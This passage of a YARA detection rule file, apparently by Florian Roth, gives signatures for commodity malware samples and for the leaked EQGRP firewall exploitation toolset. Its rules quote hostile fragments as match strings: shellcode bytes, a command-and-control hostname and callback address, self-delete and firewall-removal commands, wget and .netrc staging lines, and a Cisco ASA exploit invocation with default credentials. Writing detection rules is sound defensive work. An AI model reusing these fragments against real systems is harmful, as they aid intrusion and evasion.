      date = "2016-09-04 14:54:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1086, T1110, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "::FromBase64String('TgBUAEwATQA=')" ascii
      $s2 = "::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))" ascii
      $s3 = "::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))" ascii
      $s4 = "::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))" ascii
      $s5 = "[Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`" fullword ascii
      $s6 = "KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA" ascii
      $s7 = "}.bruteforce_running)" ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
} 

rule Malware_QA_not_copy_RID2E95 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "VT Research QA uploaded malware - file not copy.exe"
      author = "Florian Roth"
      reference = "VT Research QA"
      date = "2016-08-29 11:20:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "U2VydmVyLmV4ZQ==" fullword wide
      $x2 = "\\not copy\\obj\\Debug\\not copy.pdb" ascii
      $x3 = "fuckyou888.ddns.net" fullword wide
      $s1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide
      $s2 = "Server.exe" fullword wide
      $s3 = "Execute ERROR" fullword wide
      $s4 = "not copy.exe" fullword wide
      $s5 = "Non HosT" fullword wide
      $s6 = "netsh firewall delete allowedprogram" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( 5 of them )
} 

rule Malware_QA_update_RID2DAD : DEMO EXE FILE MAL T1136 {
   meta:
      description = "VT Research QA uploaded malware - file update.exe"
      author = "Florian Roth"
      reference = "VT Research QA"
      date = "2016-08-29 10:42:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "UnActiveOfflineKeylogger" fullword ascii
      $x2 = "BTRESULTDownload File|Mass Download : File Downloaded , Executing new one in temp dir...|" fullword ascii
      $x3 = "ActiveOnlineKeylogger" fullword ascii
      $x4 = "C:\\Users\\DarkCoderSc\\" ascii
      $x5 = "Celesty Binder\\Stub\\STATIC\\Stub.pdb" ascii
      $x6 = "BTRESULTUpdate from URL|Update : File Downloaded , Executing new one in temp dir...|" fullword ascii
      $s1 = "MSRSAAP.EXE" fullword wide
      $s2 = "Command successfully executed!|" fullword ascii
      $s3 = "BTMemoryLoadLibary: Get DLLEntyPoint failed" fullword ascii
      $s4 = "I wasn't able to open the hosts file, maybe because UAC is enabled in remote computer!" fullword ascii
      $s5 = "\\Internet Explorer\\iexplore.exe" fullword ascii
      $s6 = "ping 127.0.0.1 -n 4 > NUL && \"" fullword ascii
      $s7 = "BTMemoryGetProcAddress: DLL doesn't export anything" fullword ascii
      $s8 = "POST /index.php/1.0" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( all of them )
} 

rule Malware_QA_tls_RID2C7D : DEMO EXE FILE MAL T1136 {
   meta:
      description = "VT Research QA uploaded malware - file tls.exe"
      author = "Florian Roth"
      reference = "VT Research QA"
      date = "2016-08-29 09:51:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\funoverip\\ultimate-payload-template1\\" ascii
      $s2 = "ULTIMATEPAYLOADTEMPLATE1" fullword wide
      $s3 = "ultimate-payload-template1" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them ) or ( all of them )
} 

rule Malware_QA_get_The_FucKinG_IP_RID31C8 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "VT Research QA uploaded malware - file get The FucKinG IP.exe"
      author = "Florian Roth"
      reference = "VT Research QA"
      date = "2016-08-29 13:37:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "C:\\Users\\Mdram ahmed\\AppData" 
      $x2 = "\\Local\\Temporary Projects\\get The FucKinG IP\\" ascii
      $x3 = "get The FucKinG IP.exe" fullword wide
      $x4 = "get ip by mdr3m" fullword wide
      $x5 = "MDR3M kik: Mdr3mhm" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of ( $x* ) ) or ( 2 of them )
} 

rule Malware_QA_1177_RID2BFA : DEMO FILE MAL T1136 {
   meta:
      description = "VT Research QA uploaded malware - file 1177.vbs"
      author = "Florian Roth"
      reference = "VT Research QA"
      date = "2016-08-29 09:29:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ".specialfolders (\"startup\") & \"\\ServerName.EXE\"" fullword ascii
      $x2 = "expandenvironmentstrings(\"%%InsallDir%%\") " ascii
      $s1 = "CreateObject(\"WScript.Shell\").Run(" ascii
      $s2 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAA" ascii
      $s3 = "cial Thank's to Dev-point.com" fullword ascii
      $s4 = ".createElement(\"tmp\")" fullword ascii
      $s5 = "'%CopyToStartUp%" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x4d27 and filesize < 100KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( 5 of them )
} 

rule WCE_in_memory_RID2C1E : DEMO HKTL T1003 T1136 {
   meta:
      description = "Detects Windows Credential Editor (WCE) in memory (and also on disk)"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-08-28 09:35:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "wkKUSvflehHr::o:t:s:c:i:d:a:g:" fullword ascii
      $s2 = "wceaux.dll" fullword ascii
   condition: 
      all of them
} 

rule b374k_back_connect_RID2DB5 : APT DEMO EXE FILE T1068 T1136 {
   meta:
      description = "Detects privilege escalation tool"
      author = "Florian Roth"
      reference = "Internal Analysis"
      date = "2016-08-18 10:43:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      tags = "APT, DEMO, EXE, FILE, T1068, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "AddAtomACreatePro" fullword ascii
      $s2 = "shutdow" fullword ascii
      $s3 = "/config/i386" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and all of them )
} 

rule APT_EQGRP_RC5_RC6_Opcode_RID2EE0 : APT DEMO {
   meta:
      description = "EQGRP Toolset Firewall - RC5 / RC6 opcode"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/incidents/75812/the-equation-giveaway/"
      date = "2016-08-17 11:33:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO"
      minimum_yara = "1.7"
      
   strings:
      $s1 = { 8B 74 91 FC 81 EE 47 86 C8 61 89 34 91 42 83 FA 2B } 
   condition: 
      1 of them
} 

rule APT_install_get_persistent_filenames_RID35AE : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file install_get_persistent_filenames"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 16:23:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Generates the persistence file name and prints it out." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and all of them )
} 

rule APT_EQGRP_create_dns_injection_RID326D : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file create_dns_injection.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 14:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Name:   A hostname: 'host.network.com', a decimal numeric offset within" fullword ascii
      $s2 = "-a www.badguy.net,CNAME,1800,host.badguy.net \\\\" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_screamingplow_RID2FAE : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file screamingplow.sh"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "What is the name of your PBD:" fullword ascii
      $s2 = "You are now ready for a ScreamPlow" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_MixText_RID2D06 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file MixText.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:14:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "BinStore enabled implants." fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_tunnel_state_reader_RID321B : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file tunnel_state_reader"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 13:51:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Active connections will be maintained for this tunnel. Timeout:" fullword ascii
      $s5 = "%s: compatible with BLATSTING version 1.2" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_payload_RID2D1D : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file payload.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "can't find target version module!" fullword ascii
      $s2 = "class Payload:" fullword ascii
   condition: 
      all of them
} 

rule APT_EQGRP_BUSURPER_2211_724_RID2ECC : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file BUSURPER-2211-724.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".got_loader" fullword ascii
      $s2 = "_start_text" fullword ascii
      $s3 = "IMPLANT" fullword ascii
      $s4 = "KEEPGOING" fullword ascii
      $s5 = "upgrade_implant" fullword ascii
   condition: 
      all of them
} 

rule APT_EQGRP_epicbanana_2_1_0_1_RID3075 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file epicbanana_2.1.0.1.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:40:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "failed to create version-specific payload" fullword ascii
      $s2 = "(are you sure you did \"make [version]\" in versions?)" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_userscript_RID2E87 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file userscript.FW"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:18:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Are you sure? Don't forget that NETSCREEN firewalls require BANANALIAR!! " fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_uninstallPBD_RID2EE3 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file uninstallPBD.bat"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:33:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "memset 00e9a05c 4 38845b88" fullword ascii
      $s2 = "_hidecmd" fullword ascii
      $s3 = "memset 013abd04 1 0d" fullword ascii
   condition: 
      all of them
} 

rule APT_EQGRP_tinyexec_RID2D9C : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - from files tinyexec"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE"
      minimum_yara = "1.7"
      
   strings:
      $s1 = { 73 68 73 74 72 74 61 62 00 2E 74 65 78 74 } 
      $s2 = { 5A 58 55 52 89 E2 55 50 89 E1 } 
   condition: 
      uint32 ( 0 ) == 0x464c457f and filesize < 270 and all of them
} 

rule APT_EQGRP_callbacks_RID2DD3 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - Callback addresses"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "30.40.50.60:9342" fullword ascii wide
   condition: 
      1 of them
} 

rule APT_EQGRP_Unique_Strings_RID2FF3 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - Unique strings"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:19:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/BananaGlee/ELIGIBLEBOMB" ascii
      $s2 = "Protocol must be either http or https (Ex: https://1.2.3.4:1234)" 
   condition: 
      1 of them
} 

rule APT_EQGRP_eligiblecandidate_RID310D : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file eligiblecandidate.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 13:06:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $o1 = "Connection timed out. Only a problem if the callback was not received." fullword ascii
      $o2 = "Could not reliably detect cookie. Using 'session_id'..." fullword ascii
      $c1 = "def build_exploit_payload(self,cmd=\"/tmp/httpd\"):" fullword ascii
      $c2 = "self.build_exploit_payload(cmd)" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_networkProfiler_orderScans_RID34F3 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file networkProfiler_orderScans.sh"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 15:52:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Unable to save off predefinedScans directory" fullword ascii
      $x2 = "Re-orders the networkProfiler scans so they show up in order in the LP" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_sniffer_xml2pcap_RID30A6 : APT DEMO T1040 T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file sniffer_xml2pcap"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:48:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1040, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "-s/--srcip <sourceIP>  Use given source IP (if sniffer doesn't collect source IP)" fullword ascii
      $x2 = "convert an XML file generated by the BLATSTING sniffer module into a pcap capture file." fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_BananaAid_RID2D82 : APT DEMO T1105 T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file BananaAid"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1105, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "(might have to delete key in ~/.ssh/known_hosts on linux box)" fullword ascii
      $x2 = "scp BGLEE-" ascii
      $x3 = "should be 4bfe94b1 for clean bootloader version 3.0; " fullword ascii
      $x4 = "scp <configured implant> <username>@<IPaddr>:onfig" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_bo_RID2B04 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file bo"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 08:48:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ERROR: failed to open %s: %d" fullword ascii
      $s2 = "__libc_start_main@@GLIBC_2.0" fullword ascii
      $s3 = "serial number: %s" fullword ascii
      $s4 = "strerror@@GLIBC_2.0" fullword ascii
      $s5 = "ERROR: mmap failed: %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 20KB and all of them )
} 

rule APT_EQGRP_SecondDate_2211_RID2F32 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file SecondDate-2211.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SD_processControlPacket" fullword ascii
      $s2 = "Encryption_rc4SetKey" fullword ascii
      $s3 = ".got_loader" fullword ascii
      $s4 = "^GET.*(?:/ |\\.(?:htm|asp|php)).*\\r\\n" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )
} 

rule APT_EQGRP_config_jp1_UA_RID2F08 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file config_jp1_UA.pl"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:39:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "This program will configure a JETPLOW Userarea file." fullword ascii
      $x2 = "Error running config_implant." fullword ascii
      $x3 = "NOTE:  IT ASSUMES YOU ARE OPERATING IN THE INSTALL/LP/JP DIRECTORY. THIS ASSUMPTION " fullword ascii
      $x4 = "First IP address for beacon destination [127.0.0.1]" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_BBALL_M50FW08_2201_RID2ECA : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file BBALL_M50FW08-2201.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:29:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".got_loader" fullword ascii
      $s2 = "LOADED" fullword ascii
      $s3 = "pageTable.c" fullword ascii
      $s4 = "_start_text" fullword ascii
      $s5 = "handler_readBIOS" fullword ascii
      $s6 = "KEEPGOING" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 5 of ( $s* ) )
} 

rule APT_EQGRP_BUSURPER_3001_724_RID2ECA : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file BUSURPER-3001-724.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:29:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "IMPLANT" fullword ascii
      $s2 = "KEEPGOING" fullword ascii
      $s3 = "upgrade_implant" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and 2 of them ) or ( all of them )
} 

rule APT_EQGRP_workit_RID2CD3 : APT DEMO T1105 T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file workit.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:05:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1105, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "macdef init > /tmp/.netrc;" fullword ascii
      $s2 = "/usr/bin/wget http://" fullword ascii
      $s3 = "HOME=/tmp ftp" fullword ascii
      $s4 = " >> /tmp/.netrc;" fullword ascii
      $s5 = "/usr/rapidstream/bin/tftp" fullword ascii
      $s6 = "created shell_command:" fullword ascii
      $s7 = "rm -f /tmp/.netrc;" fullword ascii
      $s8 = "echo quit >> /tmp/.netrc;" fullword ascii
      $s9 = "echo binary >> /tmp/.netrc;" fullword ascii
      $s10 = "chmod 600 /tmp/.netrc;" fullword ascii
      $s11 = "created cli_command:" fullword ascii
   condition: 
      6 of them
} 

rule APT_EQGRP_tinyhttp_setup_RID3047 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file tinyhttp_setup.sh"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:33:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "firefox http://127.0.0.1:8000/$_name" fullword ascii
      $x2 = "What is the name of your implant:" fullword ascii
      $x3 = "killall thttpd" fullword ascii
      $x4 = "copy http://<IP>:80/$_name flash:/$_name" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 2KB and 1 of ( $x* ) ) or ( all of them )
} 

rule APT_EQGRP_shellcode_RID2DE6 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file shellcode.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:51:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "execute_post = '\\xe8\\x00\\x00\\x00\\x00\\x5d\\xbe\\xef\\xbe\\xad\\xde\\x89\\xf7\\x89\\xec\\x29\\xf4\\xb8\\x03\\x00\\x00\\x00" ascii
      $s2 = "tiny_exec = '\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x03\\x00\\x01\\x00\\x00" ascii
      $s3 = "auth_id = '\\x31\\xc0\\xb0\\x03\\x31\\xdb\\x89\\xe1\\x31\\xd2\\xb6\\xf0\\xb2\\x0d\\xcd\\x80\\x3d\\xff\\xff\\xff\\xff\\x75\\x07" ascii
      $c1 = { e8 00 00 00 00 5d be ef be ad de 89 f7 89 ec 29 f4 b8 03 00 00 00 } 
      $c3 = { 31 c0 b0 03 31 db 89 e1 31 d2 b6 f0 b2 0d cd 80 3d ff ff ff ff 75 07 } 
   condition: 
      1 of them
} 

rule APT_EQGRP_EPBA_RID2B4B : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file EPBA.script"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 09:00:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "./epicbanana_2.0.0.1.py -t 127.0.0.1 --proto=ssh --username=cisco --password=cisco --target_vers=asa804 --mem=NA -p 22 " fullword ascii
      $x2 = "-t TARGET_IP, --target_ip=TARGET_IP -- Either 127.0.0.1 or Win Ops IP" fullword ascii
      $x3 = "./bride-1100 --lp 127.0.0.1 --implant 127.0.0.1 --sport RHP --dport RHP" fullword ascii
      $x4 = "--target_vers=TARGET_VERS    target Pix version (pix712, asa804) (REQUIRED)" fullword ascii
      $x5 = "-p DEST_PORT, --dest_port=DEST_PORT defaults: telnet=23, ssh=22 (optional) - Change to LOCAL redirect port" fullword ascii
      $x6 = "this operation is complete, BananaGlee will" fullword ascii
      $x7 = "cd /current/bin/FW/BGXXXX/Install/LP" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2023 and filesize < 7KB and 1 of ( $x* ) ) or ( 3 of them )
} 

rule APT_EQGRP_BPIE_RID2B53 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file BPIE-2201.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 09:01:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "profProcessPacket" fullword ascii
      $s2 = ".got_loader" fullword ascii
      $s3 = "getTimeSlotCmdHandler" fullword ascii
      $s4 = "getIpIpCmdHandler" fullword ascii
      $s5 = "LOADED" fullword ascii
      $s6 = "profStartScan" fullword ascii
      $s7 = "tmpData.1" fullword ascii
      $s8 = "resetCmdHandler" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 70KB and 6 of ( $s* ) )
} 

rule APT_EQGRP_jetplow_SH_RID2E32 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file jetplow.sh"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:04:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cd /current/bin/FW/BANANAGLEE/$bgver/Install/LP/jetplow" fullword ascii
      $s2 = "***** Please place your UA in /current/bin/FW/OPS *****" fullword ascii
      $s3 = "ln -s ../jp/orig_code.bin orig_code_pixGen.bin" fullword ascii
      $s4 = "*****             Welcome to JetPlow              *****" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_BBANJO_RID2BDF : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file BBANJO-3011.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 09:25:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "get_lsl_interfaces" fullword ascii
      $s2 = "encryptFC4Payload" fullword ascii
      $s3 = ".got_loader" fullword ascii
      $s4 = "beacon_getconfig" fullword ascii
      $s5 = "LOADED" fullword ascii
      $s6 = "FormBeaconPacket" fullword ascii
      $s7 = "beacon_reconfigure" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and all of them )
} 

rule APT_EQGRP_BPATROL_2201_RID2D6B : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file BPATROL-2201.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:31:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "dumpConfig" fullword ascii
      $s2 = "getstatusHandler" fullword ascii
      $s3 = ".got_loader" fullword ascii
      $s4 = "xtractdata" fullword ascii
      $s5 = "KEEPGOING" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and all of them )
} 

rule APT_EQGRP_extrabacon_RID2E5A : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file extrabacon_1.1.0.1.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:10:51"
      score = 75
      customer = "demo"
